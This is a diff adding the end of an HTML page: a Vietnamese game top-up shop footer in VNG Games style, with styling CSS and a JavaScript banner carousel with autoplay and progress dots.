+                        <img alt="icon" loading="lazy" decoding="async" data-nimg="fill" sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw" srcset="https://shop.vnggames.com/_next-public/images/logoshop.png 256w, https://shop.vnggames.com/_next-public/images/logoshop.png 384w, https://shop.vnggames.com/_next-public/images/logoshop.png 640w, https://shop.vnggames.com/_next-public/images/logoshop.png 750w, https://shop.vnggames.com/_next-public/images/logoshop.png 828w, https://shop.vnggames.com/_next-public/images/logoshop.png 1080w, https://shop.vnggames.com/_next-public/images/logoshop.png 1200w, https://shop.vnggames.com/_next-public/images/logoshop.png 1920w, https://shop.vnggames.com/_next-public/images/logoshop.png 2048w, https://shop.vnggames.com/_next-public/images/logoshop.png 3840w" src="https://shop.vnggames.comhttps://shop.vnggames.com/_next-public/images/logoshop.png" style="position: absolute; height: 100%; width: 100%; inset: 0px; object-fit: contain; color: transparent;">
+                    </div>
+                </div>
+                <div class="css-10egq61">
+                    <div class="css-13b59u0">
+                        <div class="css-sfajb0">
+                            <div class="css-2488mo">Khám phá</div>
+                        </div>
+                        <div class="css-744h54">
+                            <a href="https://pay.zing.vn/thezing/#timdaily" target="_blank">
+                                <div class="css-qjb7pq">Đại lý thẻ Zing</div>
+                            </a>
+                        </div>
+                    </div>
+                    <div class="css-13b59u0">
+                        <div class="css-sfajb0">
+                            <div class="css-2488mo">Hỗ trợ</div>
+                        </div>
+                        <div class="css-1aspwtf">
+                            <a href="https://shop.vnggames.com/vn/instruction" target="_blank">
+                                <div class="css-qjb7pq">Hướng dẫn nạp tiền</div>
+                            </a>
+                        </div>
+                        <div class="css-1aspwtf">
+                            <a href="https://shop.vnggames.com/vn/faq" target="_blank">
+                                <div class="css-qjb7pq">Câu hỏi thường gặp</div>
+                            </a>
+                        </div>
+                        <div class="css-1aspwtf">
+                            <a href="https://support.vnggames.com/" target="_blank">
+                                <div class="css-qjb7pq">Chăm sóc khách hàng</div>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="css-uspoqe"></div>
+            <div class="css-dpkw39">
+                <div class="css-0">
+                    <div class="css-1rpm2bf">©Copyright ©2023 VNG. All Rights Reserved</div>
+                </div>
+                <div class="css-10egq61">
+                    <div class="css-13b59u0">
+                        <div class="css-744h54">
+                            <a href="https://shop.vnggames.com/vn/terms-of-service" target="_blank">
+                                <div class="css-qjb7pq">Điều khoản dịch vụ</div>
+                            </a>
+                        </div>
+                    </div>
+                    <div class="css-13b59u0">
+                        <div class="css-1aspwtf">
+                            <a href="https://privacy.vnggames.net/vn" target="_blank">
+                                <div class="css-qjb7pq">Chính sách bảo mật</div>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="/template/theme/assets/frontend/js/Roblox/icons.js"></script>
+<script src="/template/theme/assets/frontend/js/Roblox/guest.js?v=1793660123"></script>
+
+<style>
+    html,
+    body {
+        width: 100% !important;
+        max-width: 100% !important;
+        margin: 0 !important;
+        padding: 0 !important;
+        overflow-x: hidden !important;
+    }
+
+    .css-lfg2dn {
+        display: block !important;
+        position: relative !important;
+        z-index: 10 !important;
+        left: auto !important;
+        right: auto !important;
+        width: 100% !important;
+        max-width: 100% !important;
+        min-width: 0 !important;
+        margin-left: 0 !important;
+        margin-right: 0 !important;
+        padding: 0 !important;
+        background: #111 !important;
+        background-color: #111 !important;
+        color: #fff !important;
+        overflow: visible !important;
+        box-shadow: 0 0 0 100vmax #111 !important;
+        clip-path: inset(0 -100vmax) !important;
+        box-sizing: border-box !important;
+        font-family: Arial, Helvetica, sans-serif !important;
+    }
+
+    .css-lfg2dn::before,
+    .css-lfg2dn::after {
+        content: "" !important;
+        position: absolute !important;
+        top: 0 !important;
+        bottom: 0 !important;
+        z-index: -1 !important;
+        width: 100vmax !important;
+        background: #111 !important;
+        pointer-events: none !important;
+    }
+
+    .css-lfg2dn::before {
+        right: 100% !important;
+    }
+
+    .css-lfg2dn::after {
+        left: 100% !important;
+    }
+
+    .css-lfg2dn *,
+    .css-lfg2dn *::before,
+    .css-lfg2dn *::after {
+        box-sizing: border-box !important;
+    }
+
+    .css-7zhyyi {
+        width: 100% !important;
+        max-width: 1200px !important;
+        margin: 0 auto !important;
+        padding: 0 16px !important;
+        box-sizing: border-box !important;
+        overflow: hidden !important;
+    }
+
+    .css-1f6n2tc {
+        display: flex !important;
+        flex-direction: column !important;
+        width: 100% !important;
+    }
+
+    .css-hndvli {
+        display: flex !important;
+        align-items: flex-start !important;
+        justify-content: space-between !important;
+        gap: 32px !important;
+        padding: 40px 0 36px !important;
+    }
+
+    .css-0 {
+        min-width: 0 !important;
+    }
+
+    .css-ry3hyw {
+        position: relative !important;
+        width: 214px !important;
+        height: 38px !important;
+    }
+
+    .css-10egq61 {
+        display: flex !important;
+        align-items: flex-start !important;
+        justify-content: flex-end !important;
+        gap: 48px !important;
+        margin-left: auto !important;
+        text-align: left !important;
+    }
+
+    .css-13b59u0 {
+        display: flex !important;
+        flex-direction: column !important;
+        align-items: flex-start !important;
+        min-width: 110px !important;
+    }
+
+    .css-sfajb0,
+    .css-744h54,
+    .css-1aspwtf {
+        margin-bottom: 12px !important;
+    }
+
+    .css-2488mo {
+        color: rgba(255, 255, 255, 0.62) !important;
+        font-size: 14px !important;
+        font-weight: 700 !important;
+        line-height: 20px !important;
+    }
+
+    .css-qjb7pq {
+        color: #fff !important;
+        font-size: 14px !important;
+        font-weight: 700 !important;
+        line-height: 20px !important;
+        white-space: nowrap !important;
+    }
+
+    .css-lfg2dn a {
+        color: inherit !important;
+        text-decoration: none !important;
+    }
+
+    .css-uspoqe {
+        position: relative !important;
+        width: 100% !important;
+        height: 1px !important;
+        background: transparent !important;
+    }
+
+    .css-uspoqe::before {
+        content: "" !important;
+        position: absolute !important;
+        top: 0 !important;
+        left: 50% !important;
+        width: calc(100vw + 100vmax) !important;
+        min-width: calc(100vw + 100vmax) !important;
+        height: 1px !important;
+        transform: translateX(-50%) !important;
+        background: #3c3533 !important;
+        pointer-events: none !important;
+    }
+
+    .css-dpkw39 {
+        display: flex !important;
+        align-items: center !important;
+        justify-content: space-between !important;
+        gap: 32px !important;
+        padding: 18px 0 28px !important;
+    }
+
+    .css-1rpm2bf {
+        color: #fff !important;
+        font-size: 14px !important;
+        font-weight: 400 !important;
+        line-height: 20px !important;
+        white-space: nowrap !important;
+    }
+
+
+    @media (max-width: 900px) {
+        .css-hndvli,
+        .css-dpkw39 {
+            flex-direction: column !important;
+            align-items: flex-start !important;
+            justify-content: flex-start !important;
+            gap: 20px !important;
+        }
+
+        .css-10egq61 {
+            width: 100% !important;
+            flex-wrap: nowrap !important;
+            justify-content: space-between !important;
+            align-items: flex-start !important;
+            margin-left: 0 !important;
+            gap: 24px !important;
+        }
+
+        .css-13b59u0 {
+            flex: 0 0 calc(50% - 12px) !important;
+            min-width: 0 !important;
+            max-width: calc(50% - 12px) !important;
+        }
+
+        .css-ry3hyw {
+            width: 190px !important;
+            height: 34px !important;
+        }
+
+        .css-1rpm2bf,
+        .css-qjb7pq,
+        .css-2488mo {
+            white-space: normal !important;
+            overflow-wrap: anywhere !important;
+        }
+        
+     
+</style>
+
+
+
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const bannerRoot = document.querySelector('.embla-homepage-banner');
+
+    if (!bannerRoot) {
+        return;
+    }
+
+    const container = bannerRoot.querySelector('.embla__container');
+    const slides = Array.from(
+        bannerRoot.querySelectorAll('.embla__slide')
+    );
+
+    const prevButton = bannerRoot.querySelector('.embla__button--prev');
+    const nextButton = bannerRoot.querySelector('.embla__button--next');
+
+    const dotsContainer = bannerRoot.querySelector('.embla__dots');
+    let dots = Array.from(
+        bannerRoot.querySelectorAll('.embla__dot')
+    );
+
+    const backgroundImage = document.querySelector('.css-mib5dl img');
+
+    if (!container || slides.length === 0) {
+        return;
+    }
+
+    let currentIndex = 0;
+    let autoplayTimer = null;
+    const autoplayDelay = 5000;
+
+    /*
+     * Nếu số dot không đủ, tự tạo lại đúng bằng số slide.
+     */
+    if (dotsContainer && dots.length !== slides.length) {
+        dotsContainer.innerHTML = '';
+
+        slides.forEach(function (_, index) {
+            const dot = document.createElement('button');
+
+            dot.type = 'button';
+            dot.className = 'embla__dot';
+            dot.setAttribute('aria-label', 'Chuyển đến banner ' + (index + 1));
+
+            const progress = document.createElement('div');
+            progress.className = 'embla__dot-progress css-0';
+
+            dot.appendChild(progress);
+            dotsContainer.appendChild(dot);
+        });
+
+        dots = Array.from(
+            bannerRoot.querySelectorAll('.embla__dot')
+        );
+    }
+
+    /*
+     * Nếu dot đã tồn tại nhưng thiếu progress thì tự thêm.
+     */
+    dots.forEach(function (dot) {
+        let progress = dot.querySelector('.embla__dot-progress');
+
+        if (!progress) {
+            progress = document.createElement('div');
+            progress.className = 'embla__dot-progress css-0';
+            dot.appendChild(progress);
+        }
+    });
+
+    function normalizeIndex(index) {
+        if (index < 0) {
+            return slides.length - 1;
+        }
+
+        if (index >= slides.length) {
+            return 0;
+        }
+
+        return index;
+    }
+
+    function getSlideImage(index) {
+        const slide = slides[index];
+
+        if (!slide) {
+            return null;
+        }
+
+        return slide.querySelector('img');
+    }
+
+    function updateBackground(index) {
+        const activeImage = getSlideImage(index);
+
+        if (!activeImage || !backgroundImage) {
+            return;
+        }
+
+        const imageSource = activeImage.currentSrc || activeImage.src;
+
+        if (!imageSource) {
+            return;
+        }
+
+        backgroundImage.style.opacity = '0';
+
+        window.setTimeout(function () {
+            backgroundImage.removeAttribute('srcset');
+            backgroundImage.src = imageSource;
+            backgroundImage.style.opacity = '1';
+        }, 180);
+    }
+
+    function resetProgress(progress) {
+        if (!progress) {
+            return;
+        }
+
+        progress.style.transition = 'none';
+        progress.style.width = '0%';
+
+        /*
+         * Ép reflow để trình duyệt ghi nhận width = 0.
+         */
+        void progress.offsetWidth;
+
+        progress.style.transition = '';
+    }
+
+    function startProgress(dot) {
+        const progress = dot.querySelector('.embla__dot-progress');
+
+        if (!progress) {
+            return;
+        }
+
+        resetProgress(progress);
+
+        dot.classList.add('embla__dot--selected');
+
+        /*
+         * Chờ một frame rồi mới thêm is-animating,
+         * để transition chạy từ 0% lên 100%.
+         */
+        requestAnimationFrame(function () {
+            requestAnimationFrame(function () {
+                dot.classList.add('is-animating');
+            });
+        });
+    }
+
+    function updateDots(index) {
+        dots.forEach(function (dot, dotIndex) {
+            const progress = dot.querySelector('.embla__dot-progress');
+
+            dot.classList.remove(
+                'embla__dot--selected',
+                'is-animating'
+            );
+
+            resetProgress(progress);
+
+            if (dotIndex === index) {
+                startProgress(dot);
+            }
+        });
+    }
+
+    function showSlide(index) {
+        currentIndex = normalizeIndex(index);
+
+        container.style.transition = 'transform 500ms ease';
+        container.style.transform =
+            'translate3d(-' + (currentIndex * 100) + '%, 0, 0)';
+
+        updateDots(currentIndex);
+        updateBackground(currentIndex);
+    }
+
+    function showNextSlide() {
+        showSlide(currentIndex + 1);
+    }
+
+    function showPrevSlide() {
+        showSlide(currentIndex - 1);
+    }
+
+    function stopAutoplay() {
+        if (autoplayTimer !== null) {
+            window.clearInterval(autoplayTimer);
+            autoplayTimer = null;
+        }
+    }
+
+    function startAutoplay() {
+        stopAutoplay();
+
+        autoplayTimer = window.setInterval(function () {
+            showNextSlide();
+        }, autoplayDelay);
+    }
+
+    function restartAutoplay() {
+        stopAutoplay();
+        startAutoplay();
+    }
+
+    if (nextButton) {
+        nextButton.addEventListener('click', function () {
+            showNextSlide();
+            restartAutoplay();
+        });
+    }
+
+    if (prevButton) {
+        prevButton.addEventListener('click', function () {
+            showPrevSlide();
+            restartAutoplay();
+        });
+    }
+
+    dots.forEach(function (dot, index) {
+        dot.addEventListener('click', function () {
+            showSlide(index);
+            restartAutoplay();
+        });
+    });
+
+    bannerRoot.addEventListener('mouseenter', function () {
+    stopAutoplay();
+});
+
+bannerRoot.addEventListener('mouseleave', function () {
+    startAutoplay();
+});
+
+    showSlide(0);
+    startAutoplay();
+});
+</script>
+<style>
+     .css-l5kn1c {
+    position: relative !important;
+    overflow: hidden;
+    border-radius: 10px;
+}
+
+.css-nlmafb {
+    position: absolute !important;
+    top: 0 !important;
+    right: 0 !important;
+    left: auto !important;
+
+    width: 96px !important;
+    height: 36px !important;
+
+    z-index: 20 !important;
+    pointer-events: none;
+}
+
+.css-nlmafb svg {
+    display: block;
+    width: 100%;
+    height: 100%;
+}
+              </style>
 </body>
+
 </html>
